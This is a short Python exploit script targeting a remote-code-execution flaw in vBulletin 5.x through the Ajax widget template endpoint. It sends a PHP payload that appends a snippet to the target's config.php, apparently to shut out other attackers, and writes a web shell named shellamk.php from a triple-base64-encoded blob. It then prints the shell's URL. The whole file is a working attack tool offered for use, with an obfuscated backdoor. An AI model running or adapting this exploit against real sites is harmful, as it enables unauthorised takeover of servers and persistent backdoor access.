#/
#   Codder : 0x0fy
#   twitter.com/0x00fy
#\

#!/usr/bin/env python3 
import argparse
import requests
import sys
 
def run_exploit(vb_loc):
    post_data = {'subWidgets[0][template]' : 'widget_php',
                'subWidgets[0][config][code]' : '$kok = fopen("config.php","a");echo fwrite($kok,base64_decode("Pz48P3BocCBpZigkX1JFUVVFU1RbInN1YldpZGdldHMiXSl7ZXhpdCgpO30gPz4="));fclose($kok);$file = fopen("shellamk.php","w");echo fwrite($file,base64_decode(base64_decode(base64_decode("VUVRNWQyRklRVTVEWnpCTFNVTkNiRmt5YUhaSlEyTTRXbTA1ZVdKVFFtaFpNMUp3WWpJME9VbHBTV2RpVjFZd1lVYzVhMUJUU25kaU0wNHdTV2xDYkdKdFRqQmxXRUpzVUZOS2RHUlhlREJoV0VKb1kyNVJkbHB0T1hsaVV6RnJXVmhTYUVscFFuVlpWekZzVUZOS01XTkhlSFpaVjFKc1kybEpaMkZYVVRsSmJsWjNZa2M1YUZwSFZubEphalJ1VDNjd1MwbERRbXhaTW1oMlNVTmpPR0ZYTlhka1dGRm5aRWhzZDFwVU1HbGFiV3h6V2xOSloySnRSblJhVkRCcFdtMXNjMXBUU1dkak1tdzJXbFF3YVU1VVFXbFFhbmh3WW01Q01XUkRRblZaVnpGc1VGTktabVJZUW5OSmFVSXdaVmhDYkZCVFNucGtWMHAwWVZoUmFVbEhiR3RRVTBwbVpGaENjMGxwUWpKWlYzZ3hXbFF3YVZaWVFuTmlNa1pyU1dvME9Fd3lXblpqYlRBclNucHpUa05wUVdkSlIyeHRTME5CYTFneFFsQlZNVkppU2pFNU1XTkhkMjVZVTBFNVVGTkJibFpZUW5OaU1rWnJTbmxCY0VsSWMydGFiV3h6V2xOQk9VbERVbVpTYTJ4TlVsWk9Za295V25CaVIxVnVXRlp6Ym1KdFJuUmFVMlJrVHpKc2JVdEZRbXBpTTBJMVMwTlNabEpyYkUxU1ZrNWlTakphY0dKSFZXNVlWbk51WkVjeGQxZ3lOV2hpVjFWdVdGTjNaMHBHT1VkVFZYaEdWVEZ6YmxwdGJITmFVMlJrVjNsa2RWbFhNV3hLTVRCd1MxTkNOMFJSYjJkSlExSTJZVmhCWjFCVFFuVmFXR05uVjIxc2QxRllTbXBoUjJ3eVdsUjBjRnBwUVc5S1NIQndZME13SzJJelFteGlhV2RyV20xc2MxcFRhMmRRVkRBNVNVWlNVMVpWVlhCSlNITnJaVzFzZDB4VU5XeGxTRko1V1ZkT01GWkhPRzlLZVRSMlNubHJOMHBJY0hCalF6QXJXVEo0ZG1NeVZXOUxWSFJzV1RKb2RrbERaRnAzTjNoeVlrZFdkRnBUUWtOWlkxZG1XVmhNUlhOWGVrVnpVMk0zWmxOQ2JHSklUbXhKU0hSc1dUSm9ka2xEWkZwM04zaHlZa2RXZFZwSGEyZFJWelZxV1ZkelozYzBaa1Z6VjNSb1kyMHhhRWxGU21oNFdqbG9ZM05UZUdNNFUzaGxhVFJ1VHpNd1oyWlhWbk5qTWxZM1dsZE9iMko1UVc1UVIwa3JVVzFHZWxsWVNuQmpNbXcyVUVNNWFWQnFlR2xqYWpRNFdXNUpLMHA2ZERsbVUwRk9RMmN3UzFCNk5FNURaejA5"))));fclose($file);exit;'
                }
    r = requests.post('%s/ajax/render/widget_tabbedcontainer_tab_panel' % vb_loc, post_data)
    return r.text
 
ap = argparse.ArgumentParser(description='vBulletin 5.x Ajax Widget Template RCE')
ap.add_argument('-l', '--location', required=True, help='Web address to root of vB5 install.')
ARGS = ap.parse_args()
print(run_exploit(ARGS.location))
print("shell atildi ve Patchlendi: "+ str(ARGS.location)+"/shellamk.php")
